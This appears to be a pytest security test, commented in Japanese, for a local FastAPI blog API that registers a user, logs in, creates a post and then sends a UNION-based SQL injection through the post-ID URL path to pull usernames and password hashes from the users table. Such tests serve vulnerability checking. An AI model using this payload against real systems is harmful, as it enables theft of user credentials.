import requests
import secrets
import string
import pytest

# APIのベースURL
BASE_URL = "http://localhost:8000"  # FastAPIのデフォルトのアドレスとポート

def generate_random_string(length: int) -> str:
    alphabet = string.ascii_letters + string.digits
    return ''.join(secrets.choice(alphabet) for i in range(length))

# ユーザー登録
def register_user(username, password):
    payload = {"username": username, "password": password}
    response = requests.post(f"{BASE_URL}/user/register/", json=payload)
    return response.json()

# ログイン
def login_user(username, password):
    data = {
        "username": username,
        "password": password,
        "grant_type": "", 
        "scope": "", 
        "client_id": "", 
        "client_secret": ""
    }
    response = requests.post(f"{BASE_URL}/user/login", data=data)
    return response.json()["access_token"]

# 投稿作成
def create_post(title, content, token):
    headers = {"Authorization": f"Bearer {token}"}
    payload = {"title": title, "content": content}
    response = requests.post(f"{BASE_URL}/post/create", headers=headers, json=payload)
    return response.json()

# 投稿取得（SQLiを悪用してユーザ情報を取得）
def malicious_get_post(post_id, token):
    headers = {}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    payload = f"{post_id} UNION SELECT id, username, hashed_password, 1, 1 FROM users"
    response = requests.get(f"{BASE_URL}/post/{payload}", headers=headers)
    return response.json()

@pytest.fixture(scope="module")
def user_data():
    username = generate_random_string(10)
    password = generate_random_string(10)
    user_info = register_user(username, password)
    token = login_user(username, password)
    post = create_post("Test Title", "Test Content", token)
    return username, password, user_info, token, post

def test_sql_injection_attack(user_data):
    _, _, _, token, post = user_data

    # 悪意のあるSQLi攻撃をシミュレート
    malicious_result = malicious_get_post(post["id"], token)
    
    # もしSQLiが成功した場合、以下の情報が返されることを想定
    assert len(malicious_result) > 0